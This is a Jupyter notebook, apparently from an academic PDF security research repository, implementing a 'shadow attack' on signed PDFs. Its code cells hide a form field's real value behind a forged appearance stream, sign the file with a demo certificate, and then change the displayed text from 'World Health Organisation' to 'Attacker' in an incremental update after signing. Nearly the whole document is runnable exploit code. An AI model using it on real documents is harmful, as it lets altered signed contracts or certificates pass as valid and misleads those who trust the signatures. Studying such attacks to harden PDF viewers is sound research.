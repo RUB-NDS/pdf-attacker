{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 0: Configuration Parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "folder_path                     = \"./../../../shadow-exploits/replace/forms/\"\n",
    "signer_path                     = \"./../../../ressources/pdf-signer/\"\n",
    "\n",
    "input_file                      = \"\" # type the file name which you want to attack; if empty - a default PDF will be generated\n",
    "shadowed_file                   = \"replace-form-shadowed.pdf\"\n",
    "shadowed_file_signed            = \"replace-form-shadowed-signed.pdf\"\n",
    "shadowed_file_signed_manipulated= \"replace-form-shadowed-signed-manipulated.pdf\"\n",
    "\n",
    "formText2Manipulation           = \"Attacker\"\n",
    "formText2Replace                = \"World Health Organisation\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 0.1: Create default PDF if no PDF file is provided as input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import fitz\n",
    "\n",
    "if not input_file:\n",
    "    input_file = \"honest.pdf\"\n",
    "    doc = fitz.open()                      # new empty PDF\n",
    "    doc.insertPage(0)                      # creates an ISO-A4 portrait page\n",
    "    page = doc[-1]                         # this is the page\n",
    "    # page.insertText(fitz.Point(72, 72),formText2Replace,fontname=\"tiro\", fontsize = 14)\n",
    "    \n",
    "    widget = fitz.Widget()\n",
    "    widget.field_type = fitz.PDF_WIDGET_TYPE_TEXT\n",
    "    widget.rect = fitz.Rect(25,25,220,40)\n",
    "    widget.field_name = \"texfield1\"\n",
    "    widget.text_fontsize = 14\n",
    "    widget.field_value = formText2Replace\n",
    "    page.addWidget(widget)\n",
    "    doc.save(folder_path+input_file)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 1: Generating shadow document\n",
    "The following script finds the form field which will be shadowed by searching its value (*formText2Replace*).\n",
    "On the presentation level, the new document (*shadowed_file*) does not differ from the previous one (*input_file*)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import types\n",
    "import os\n",
    "import io\n",
    "import re\n",
    "import mmap\n",
    "from random import choice\n",
    "from string import ascii_lowercase\n",
    "import PyPDF4 as pyPDF\n",
    "from PyPDF4 import utils\n",
    "from PyPDF4.generic import *\n",
    "from PyPDF4.utils import *\n",
    "from PyPDF4.pdf import *\n",
    "import fitz\n",
    "import shutil\n",
    "\n",
    "pdf_reader = pyPDF.PdfFileReader(open(folder_path+input_file, mode=\"rb\"))\n",
    "list(pdf_reader.pages) # Process all the objects.\n",
    "pdf_writer = pyPDF.PdfFileWriter()\n",
    "\n",
    "def set_need_appearances_writer(writer: PdfFileWriter):\n",
    "    try:\n",
    "        catalog = writer._root_object\n",
    "        # get the AcroForm tree\n",
    "        if \"/AcroForm\" not in catalog:\n",
    "            writer._root_object.update({\n",
    "                NameObject(\"/AcroForm\"): IndirectObject(len(writer._objects), 0, writer)})\n",
    "\n",
    "        need_appearances = NameObject(\"/NeedAppearances\")\n",
    "        writer._root_object[\"/AcroForm\"][need_appearances] = BooleanObject(True)\n",
    "        return writer\n",
    "\n",
    "    except Exception as e:\n",
    "        print('set_need_appearances_writer() catch : ', repr(e))\n",
    "        return writer\n",
    "\n",
    "def update_field_values(writer: PdfFileWriter):\n",
    "    fields = pdf_reader.getFields()\n",
    "    changed_form_name = \"\"\n",
    "    for key,val in fields.items():\n",
    "        field = DictionaryObject(val)\n",
    "\n",
    "        for key2, val2 in field.items():\n",
    "            if val2 == formText2Replace:\n",
    "                changed_form_name = field[\"/T\"]\n",
    "                field_dictionary = {key:formText2Manipulation}\n",
    "                writer.updatePageFormFieldValues(writer.getPage(0),field_dictionary)\n",
    "                try:\n",
    "                    appearance = field.get('/AP').getObject().get('/N').getObject()\n",
    "                    shadowed = appearance.getData().replace(bytes(formText2Manipulation,\"ascii\"), bytes(formText2Replace,\"ascii\"))\n",
    "                    streamAP = DecodedStreamObject()\n",
    "                    for key, val in appearance.items():\n",
    "                        if key == \"/Filter\" or key == \"/Length\":\n",
    "                            pass\n",
    "                        else:\n",
    "                            streamAP.update({key:val})\n",
    "                    streamAP.setData(shadowed)\n",
    "                    writer._addObject(streamAP)\n",
    "                    field.get('/AP').getObject().update({\"/N\":streamAP})\n",
    "                except:\n",
    "                    pass\n",
    "    return changed_form_name, writer\n",
    "\n",
    "for pageNum in range(pdf_reader.numPages):\n",
    "    pageObj = pdf_reader.getPage(pageNum)\n",
    "    pdf_writer.addPage(pdf_reader.getPage(pageNum))\n",
    "    changed_form_name, pdf_writer = update_field_values(pdf_writer)\n",
    "\n",
    "with open(folder_path+shadowed_file, \"wb\") as filehandle_output:\n",
    "    pdf_writer.write(filehandle_output)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "0"
     },
     "metadata": {},
     "execution_count": 37
    }
   ],
   "source": [
    "os.system('java -jar '+signer_path+'pdfsigner.jar -i '+folder_path+shadowed_file+' -o '+folder_path+shadowed_file_signed+' -pkcs '+signer_path+'demo-rsa2048.p12 -password demo-rsa2048 -sigtype approval -sigview visible -sigimg '+signer_path+'PdfInsecurityTeam-Logo.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "shutil.copyfile(folder_path+shadowed_file_signed, folder_path+shadowed_file_signed_manipulated)\n",
    "\n",
    "doc = fitz.open(folder_path+shadowed_file_signed_manipulated)\n",
    "for page in doc:\n",
    "    for field in page.widgets():\n",
    "        if field.field_name == changed_form_name:\n",
    "            field.field_value = formText2Manipulation   \n",
    "            field.update()\n",
    "doc.saveIncr()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python36964bitaab9f7a02a1344ffbf068f3bf2812102",
   "display_name": "Python 3.6.9 64-bit"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}